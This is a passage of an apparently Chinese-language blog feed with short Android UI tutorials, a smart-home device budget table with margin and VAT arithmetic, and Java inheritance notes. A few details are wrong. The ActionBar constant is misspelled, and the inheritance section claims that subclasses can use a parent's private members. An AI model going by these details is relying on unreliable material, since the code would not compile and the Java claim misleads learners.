        <content type="html"><![CDATA[<center><h1>    渐变色进度条    </h1></center><h1 id="导入ProgressBar"><a href="#导入ProgressBar" class="headerlink" title="导入ProgressBar"></a>导入ProgressBar</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201448414.jpg"></p><h1 id="在style文件下自定义progress样式"><a href="#在style文件下自定义progress样式" class="headerlink" title="在style文件下自定义progress样式"></a>在style文件下自定义progress样式</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201449192.png"></p><h1 id="编写进度条的背景样式"><a href="#编写进度条的背景样式" class="headerlink" title="编写进度条的背景样式"></a>编写进度条的背景样式</h1><ul><li><p>后景</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201450234.png"></p></li></ul><h1 id="创建前景样式"><a href="#创建前景样式" class="headerlink" title="创建前景样式"></a>创建前景样式</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201731766.jpg"></p><h1 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201452789.png"></p><h1 id="Dome请看gitee主页"><a href="#Dome请看gitee主页" class="headerlink" title="Dome请看gitee主页"></a>Dome请看gitee主页</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓Spinner下拉框字体</title>
      <link href="/2021/12/20/Spinner%E4%B8%8B%E6%8B%89%E6%A1%86%E5%AD%97%E4%BD%93/"/>
      <url>/2021/12/20/Spinner%E4%B8%8B%E6%8B%89%E6%A1%86%E5%AD%97%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<center><H1>Spinner下拉框字体</H1></center><h1 id="创建布局"><a href="#创建布局" class="headerlink" title="创建布局"></a>创建布局</h1><ul><li>创建一个布局文件写入TextView控件</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201725915.jpg"></p><h1 id="适配器"><a href="#适配器" class="headerlink" title="适配器"></a>适配器</h1><ul><li>在类文件中创建适配器将适配器装载到spinner中</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201725757.jpg"></p><h1 id="Dome请看gitee主页"><a href="#Dome请看gitee主页" class="headerlink" title="Dome请看gitee主页"></a>Dome请看gitee主页</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓CheckBox选择框</title>
      <link href="/2021/12/20/CheckBox%E8%83%8C%E6%99%AF/"/>
      <url>/2021/12/20/CheckBox%E8%83%8C%E6%99%AF/</url>
      
        <content type="html"><![CDATA[<center> <h1>CheckBox背景框</h1></center><ul><li>button属性指定他的点击和未点击的背景属性</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201436406.jpg"></p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201431185.png"></p><h1 id="Dome请看gitee主页"><a href="#Dome请看gitee主页" class="headerlink" title="Dome请看gitee主页"></a>Dome请看gitee主页</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓PopWindow弹窗</title>
      <link href="/2021/12/20/PopWindow%E5%BC%B9%E7%AA%97/"/>
      <url>/2021/12/20/PopWindow%E5%BC%B9%E7%AA%97/</url>
      
        <content type="html"><![CDATA[<center><H1>PopWindow弹窗</H1></center><h1 id="资源准备"><a href="#资源准备" class="headerlink" title="资源准备"></a>资源准备</h1><p>1、创建xml布局文件并布局好控件</p><p><img src="C:\Users\gwl\AppData\Roaming\Typora\typora-user-images\image-20211220141318381.png" alt="image-20211220141318381"></p><p>2、在使用对象文件中加载布局文件</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201414194.png"></p><h1 id="实例化PopWindow"><a href="#实例化PopWindow" class="headerlink" title="实例化PopWindow"></a>实例化PopWindow</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201415527.png"></p><h1 id="控件的查找"><a href="#控件的查找" class="headerlink" title="控件的查找"></a>控件的查找</h1><ol><li>根据布局文件加载器返回的对象来进行控件的查找</li><li><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201417629.png"></li></ol><h1 id="显示自定义的布局文件"><a href="#显示自定义的布局文件" class="headerlink" title="显示自定义的布局文件"></a>显示自定义的布局文件</h1><ol><li><p>显示</p><p><img src="C:\Users\gwl\AppData\Roaming\Typora\typora-user-images\image-20211220141856300.png" alt="image-20211220141856300"></p></li><li><p>隐藏<img src="C:\Users\gwl\AppData\Roaming\Typora\typora-user-images\image-20211220141940535.png" alt="image-20211220141940535"></p></li></ol><h1 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h1><p><img src="C:\Users\gwl\AppData\Roaming\Typora\typora-user-images\image-20211220142035087.png" alt="image-20211220142035087"></p><h1 id="Dome请看gitee主页"><a href="#Dome请看gitee主页" class="headerlink" title="Dome请看gitee主页"></a>Dome请看gitee主页</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓ActionBar导航条</title>
      <link href="/2021/12/20/ActionBar%E5%AF%BC%E8%88%AA%E6%9D%A1/"/>
      <url>/2021/12/20/ActionBar%E5%AF%BC%E8%88%AA%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<center><H1>ActionBar导航条</H1></center><h1 id="实例化控件"><a href="#实例化控件" class="headerlink" title="实例化控件"></a>实例化控件</h1><ul><li><p>实例化控件ActionBar获取支持操作栏</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ActionBar bar = getSupportActionBar();</span><br><span class="line">注意:</span><br><span class="line">需要继承AppCompatActivity类</span><br></pre></td></tr></table></figure></li></ul><h1 id="选择操作栏"><a href="#选择操作栏" class="headerlink" title="选择操作栏"></a>选择操作栏</h1><ul><li><p>选择操作栏(有好几个布局选择一个接近需求的行)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bar.setNavigationMode(ActionBar.NAYGATION_MODETABS);</span><br></pre></td></tr></table></figure></li></ul><h1 id="传入数据"><a href="#传入数据" class="headerlink" title="传入数据"></a>传入数据</h1><ul><li><p>传入数据、设置监听事件、点击事件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bar.addTab(bar.newTab().setText(<span class="string">&quot;传感器数据&quot;</span>).setTabListener(<span class="keyword">this</span>)); <span class="comment">// 需要在类中实现TabListener接口</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201347162.png"></p></li></ul><h1 id="设置Fragment"><a href="#设置Fragment" class="headerlink" title="设置Fragment"></a>设置Fragment</h1><ul><li>与fragment碎片同步滑动</li><li>自定义的ViewPage控件去监听屏幕事件</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201407596.jpg"></p><h1 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201406173.png"></p><h1 id="Dome请看gitee主页"><a href="#Dome请看gitee主页" class="headerlink" title="Dome请看gitee主页"></a>Dome请看gitee主页</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能家居设备预算表</title>
      <link href="/2021/12/05/%E9%A2%84%E7%AE%97%E8%A1%A8/"/>
      <url>/2021/12/05/%E9%A2%84%E7%AE%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<center><h1>    预算表    </h1></center><h1 id="设备预算"><a href="#设备预算" class="headerlink" title="设备预算"></a>设备预算</h1><ul><li><p>首先要知道设备的含税售价以及不含税售价就需要知道<code>成本总价</code>、<code>毛利率</code>以及<code>增值税</code>。</p><ul><li><p>例如成本价为250、毛利率为20%、增值税为17%。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">需要它们之间是如何计算的：</span><br><span class="line">    价格（不含税）＝价格（含税）÷（1-毛利率），税指的是增值税</span><br><span class="line">    价格（含税）＝价格（不含税）×（1+增值税)</span><br><span class="line"> 也就是说：</span><br><span class="line">成本价(不含税) = 250÷(1-20%) = 312.5</span><br><span class="line">成本价(含税) = 成本价(不含税)x(1+17%) = 365.625</span><br></pre></td></tr></table></figure><ul><li>所以不含税售价=312.5 含税售价=365.625</li></ul></li></ul></li></ul><p>智能家居预算表案例规范:</p><table><thead><tr><th>序号</th><th>名称</th><th>数量</th><th>单位</th><th>单价</th><th>成本总价</th><th>销售总价（不含税）</th><th>销售总价（含税)</th></tr></thead><tbody><tr><td>1</td><td>烟雾探测器</td><td>1</td><td>台</td><td>158</td><td>158</td><td>197.5</td><td>231.075</td></tr><tr><td>2</td><td>人体红外探测器</td><td>1</td><td>台</td><td>269</td><td>269</td><td>336.25</td><td>393.4125</td></tr><tr><td>3</td><td>二氧化碳检测器</td><td>1</td><td>台</td><td>980</td><td>980</td><td>1225</td><td>1433.25</td></tr><tr><td>4</td><td>PM2.5监测器</td><td>1</td><td>台</td><td>990</td><td>990</td><td>1237.5</td><td>1447.875</td></tr><tr><td>5</td><td>报警灯</td><td>1</td><td>台</td><td>250</td><td>250</td><td>312.5</td><td>365.625</td></tr><tr><td>6</td><td>换气扇</td><td>1</td><td>台</td><td>450</td><td>450</td><td>562.5</td><td>658.125</td></tr><tr><td>7</td><td>电视机</td><td>1</td><td>台</td><td>2800</td><td>2800</td><td>3500</td><td>4095</td></tr><tr><td>8</td><td>温湿度模块</td><td>1</td><td>台</td><td>280</td><td>280</td><td>350</td><td>409.5</td></tr><tr><td>9</td><td>光照度模块</td><td>1</td><td>台</td><td>458</td><td>458</td><td>572.5</td><td>669.825</td></tr><tr><td>10</td><td>气压传感器</td><td>1</td><td>台</td><td>250</td><td>250</td><td>312.5</td><td>365.625</td></tr><tr><td>11</td><td>空调</td><td>1</td><td>台</td><td>3500</td><td>3500</td><td>4375</td><td>5118.75</td></tr><tr><td>12</td><td>DVD模块</td><td>1</td><td>台</td><td>450</td><td>450</td><td>562.5</td><td>658.125</td></tr><tr><td>13</td><td>窗帘电机模块</td><td>1</td><td>台</td><td>350</td><td>350</td><td>437.5</td><td>511.875</td></tr><tr><td>14</td><td>射灯</td><td>2</td><td>台</td><td>50</td><td>100</td><td>125</td><td>146.25</td></tr><tr><td>15</td><td>网络摄像头</td><td>1</td><td>台</td><td>800</td><td>800</td><td>1000</td><td>1170</td></tr><tr><td>16</td><td>人脸识别模块</td><td>1</td><td>台</td><td>800</td><td>800</td><td>1000</td><td>1170</td></tr><tr><td>17</td><td>可视对讲机</td><td>1</td><td>台</td><td>800</td><td>800</td><td>1000</td><td>1170</td></tr><tr><td>18</td><td>A8网关</td><td>1</td><td>台</td><td>3000</td><td>3000</td><td>3750</td><td>4387.5</td></tr><tr><td>19</td><td>智能网关</td><td>1</td><td>台</td><td>1800</td><td>1800</td><td>2250</td><td>2632.5</td></tr><tr><td>20</td><td>红黑电源线</td><td>30</td><td>米</td><td>3.8</td><td>114</td><td>142.5</td><td>166.725</td></tr><tr><td>21</td><td>PVC缠绕管</td><td>30</td><td>米</td><td>0.5</td><td>15</td><td>18.75</td><td>21.9375</td></tr><tr><td>22</td><td>5类双绞线</td><td>10</td><td>米</td><td>1.5</td><td>15</td><td>18.75</td><td>21.9375</td></tr><tr><td>23</td><td>RJ45水晶头</td><td>20</td><td>个</td><td>1</td><td>20</td><td>25</td><td>29.25</td></tr><tr><td>24</td><td>工业控制用计算机</td><td>3</td><td>台</td><td>8000</td><td>24000</td><td>30000</td><td>35100</td></tr><tr><td>25</td><td>施工设备折旧费</td><td>1</td><td>组</td><td>500</td><td>500</td><td>625</td><td>731.25</td></tr><tr><td>26</td><td>其他耗材</td><td>1</td><td>组</td><td>200</td><td>200</td><td>250</td><td>292.5</td></tr><tr><td>27</td><td>劳动力成本</td><td>3</td><td>人天</td><td>500</td><td>1500</td><td>1875</td><td>2193.75</td></tr><tr><td>总计</td><td></td><td></td><td></td><td></td><td></td><td></td><td>65591.6625</td></tr><tr><td>注：</td><td>公司项目毛利率</td><td>20</td><td>%</td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>增值税率</td><td>17</td><td>%</td><td></td><td></td><td></td><td></td></tr></tbody></table><h1 id="关于第三阶段请看github"><a href="#关于第三阶段请看github" class="headerlink" title="关于第三阶段请看github"></a>关于第三阶段请看github</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SmartHome(第一阶段) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SmartHome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓自定义View折线图</title>
      <link href="/2021/11/15/Android%E6%8A%98%E7%BA%BF%E5%9B%BE/"/>
      <url>/2021/11/15/Android%E6%8A%98%E7%BA%BF%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<center><H1>使用最快速简单方式自定义View动态折线图</H1></center><h1 id="创建自定义类"><a href="#创建自定义类" class="headerlink" title="创建自定义类"></a>创建自定义类</h1><ul><li>创建类让此类继承于View</li></ul><h1 id="重写方法"><a href="#重写方法" class="headerlink" title="重写方法"></a>重写方法</h1><p>​    当类继承View时需要重写它里面的三个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ZheXianView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>(context);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">ZheXianView</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>(context, attrs);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">ZheXianView</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs, <span class="keyword">int</span> defStyleAttr)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>​    此时需要在视图窗口中画线条就需要重写onDraw方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDraw</span><span class="params">(Canvas canvas)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onDraw(canvas);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="定义四个点的坐标"><a href="#定义四个点的坐标" class="headerlink" title="定义四个点的坐标"></a>定义四个点的坐标</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201530200.jpg"></p><h1 id="在重写onDraw方法中添加画笔"><a href="#在重写onDraw方法中添加画笔" class="headerlink" title="在重写onDraw方法中添加画笔"></a>在重写onDraw方法中添加画笔</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201532776.jpg"></p><h1 id="编写线程"><a href="#编写线程" class="headerlink" title="编写线程"></a>编写线程</h1><ul><li>编写线程让界面一直更新从而达到动态折线图的效果</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201535394.jpg"></p><h1 id="handler信息发送"><a href="#handler信息发送" class="headerlink" title="handler信息发送"></a>handler信息发送</h1><ul><li><p>在构造函数中使用handler进行信息的发送</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201538680.jpg"></p></li></ul><h1 id="添加控件"><a href="#添加控件" class="headerlink" title="添加控件"></a>添加控件</h1><ul><li>在布局文件中使用自定义的View控件</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201539548.jpg"></p><h1 id="模拟数据"><a href="#模拟数据" class="headerlink" title="模拟数据"></a>模拟数据</h1><ul><li>在类文件中使用线程进行线程模拟</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201539264.jpg"></p><h1 id="Dome请看gitee主页"><a href="#Dome请看gitee主页" class="headerlink" title="Dome请看gitee主页"></a>Dome请看gitee主页</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java继承</title>
      <link href="/2021/11/06/Java%E7%BB%A7%E6%89%BF/"/>
      <url>/2021/11/06/Java%E7%BB%A7%E6%89%BF/</url>
      
        <content type="html"><![CDATA[<center><h1>Java继承</h1></center><h1 id="继承的实现"><a href="#继承的实现" class="headerlink" title="继承的实现"></a>继承的实现</h1><ul><li><p>继承的概念</p><ul><li>继承是面向对象三大特征之一，可以使子类具有父类的属性和方法，还可以在子类中重新定义，以及追加和方法实现继承的格式</li></ul></li><li><p>继承通过extends实现</p><ul><li>格式: class 子类 extends 父类{}<ul><li>举例: class Dog extends Animal{}</li></ul></li></ul></li><li><p>继承带来的好处:</p><ul><li>继承可以让类与类之间产生关系，子夫类关系，产生子类后，子类则可以使用父类中私有的成员。</li></ul></li><li><p>示例代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fu</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;show方法被调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Zi</span> <span class="keyword">extends</span> <span class="title">Fu</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;method方法被调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建对象，调用方法</span></span><br><span class="line">Fu f = <span class="keyword">new</span> Fu();</span><br><span class="line">f.show();</span><br><span class="line">Zi z = <span class="keyword">new</span> Zi();</span><br><span class="line">z.method();</span><br><span class="line">z.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="继承的好处"><a href="#继承的好处" class="headerlink" title="继承的好处"></a>继承的好处</h2><ul><li>继承的好处<ul><li>提高代码的复用性</li><li>提高代码的维护性</li></ul></li><li>继承弊端<ul><li>继承让类与类之间产生了联系，类的耦合性增强了，当父类发生改变时子类实现也不得不跟着改变，削弱了子类的独立性</li></ul></li><li>继承的应用场景<ul><li>使用继承，需要考虑类与类之间的是否存在is…a关系, 不能盲目使用继承<ul><li>is..a的关系，谁是谁的一种，例如: 老师和学生是人的一种，那人就是父类，学生和老师就是子类</li></ul></li></ul></li></ul><hr><h1 id="继承中的成员访问特点"><a href="#继承中的成员访问特点" class="headerlink" title="继承中的成员访问特点"></a>继承中的成员访问特点</h1><h2 id="继承中变量访问的特点"><a href="#继承中变量访问的特点" class="headerlink" title="继承中变量访问的特点"></a>继承中变量访问的特点</h2><ul><li><p>在子类方法中访问一个变量，采用的是就近原则</p><ol><li>子类局部范文找</li><li>子类成员范围找</li><li>父类成员范围找</li><li>如果都没找到则报错(不考虑父类的父类)</li></ol></li><li><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fu</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Zi</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">20</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">30</span>;</span><br><span class="line">System.out.println(num);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Zi z = <span class="keyword">new</span> Zi();</span><br><span class="line">z.show(); <span class="comment">// 输出show方法中的局部变量30</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="super关键字"><a href="#super关键字" class="headerlink" title="super关键字"></a>super关键字</h2><ul><li><p>this和super关键字</p><ul><li>this 代表本类对象的引用</li><li>super 代表父类存储空间的标识(可以理解为父类对象引用)</li></ul></li><li><p>this和super的使用分别</p><ul><li>成员变量<ul><li>this 成员变量 - 访问本类成员变量</li><li>super 成员变量 - 访问父类成员变量</li></ul></li><li>成员方法<ul><li>this.成员方法 - 访问本类成员方法</li><li>super.成员方法 - 访问父类成员方法 </li></ul></li></ul></li><li><p>构造方法</p><ul><li>this(…)  - 访问本类构造方法</li><li>super(…) - 访问父类构造方法</li></ul></li></ul><hr><h1 id="继承中构造方法的访问特点"><a href="#继承中构造方法的访问特点" class="headerlink" title="继承中构造方法的访问特点"></a>继承中构造方法的访问特点</h1><p><strong>注意</strong>：子类中所有的构造方法默认都会访问父类中无参的构造方法</p><p>​    子类会继承父类中的数据，可能还会使用父类的数据。所以，子类初始化之前，一定要先完成父类数据的初始化，原因在于，每一个子类构造方法的第一条语句默认是: <strong>super()</strong></p><p>​    如果父类中没有无参构造方法，只带有参构造方法的情况下可以通过super关键字去显示调用父类的带参数构造方法或者在父类中自己提供一个无参构造方法。</p><hr><h2 id="继承中成员方法的访问特点"><a href="#继承中成员方法的访问特点" class="headerlink" title="继承中成员方法的访问特点"></a>继承中成员方法的访问特点</h2><p>通过子类对象访问一个方法</p><ol><li>子类成员范围找</li><li>父类成员范围找</li><li>如果都没有则报错(不考虑父类的父类)</li></ol><hr><h2 id="super内存"><a href="#super内存" class="headerlink" title="super内存"></a>super内存</h2><ul><li>对象在堆内存中会单独在一块super区域，用来存放父类的数据</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202111061833846.png"></p><h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><ol><li>​    方法重写概念<ul><li>方法出现了和父类一模一样的方法声明(<strong>方法名一样，参数列表也必须一样</strong>)</li></ul></li><li>方法重写应用场景<ul><li>当子类需要父类的功能，而功能主体类有自己特有内容时，可以重写父类中的方法，这样即沿袭了父类的功能，又定义了子类特有的内容</li></ul></li><li>Override注解<ul><li>用来检测当前方法，是否是重写的方法，起到了[校验]的作用</li></ul></li></ol><hr><h2 id="方法重写的注意事项"><a href="#方法重写的注意事项" class="headerlink" title="方法重写的注意事项"></a>方法重写的注意事项</h2><ul><li><p>方法重写的注意事项</p><ol><li>私有方法不能被重写(父类私有成员子类是不能继承的)</li><li>子类访问权限不能更低(public &gt; 默认 &gt; 私有)</li></ol></li><li><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fu</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Fu中show()方法被调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Fu中method()方法被调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Zi</span> <span class="keyword">extends</span> <span class="title">Fu</span> </span>&#123;</span><br><span class="line"><span class="comment">/* 编译【出错】，子类不能重写父类私有的方法*/</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Zi中show()方法被调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 编译【出错】，子类重写父类方法的时候，访问权限需要大于等于父类 */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Zi中method()方法被调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 编译【通过】，子类重写父类方法的时候，访问权限需要大于等于父类 */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Zi中method()方法被调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="Java中继承的注意事项"><a href="#Java中继承的注意事项" class="headerlink" title="Java中继承的注意事项"></a>Java中继承的注意事项</h2><ul><li><p>Java中继承的注意事项</p><ol><li>Java中只支持单继承，不支持多继承</li><li>Java中支持多层继承</li></ol></li><li><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 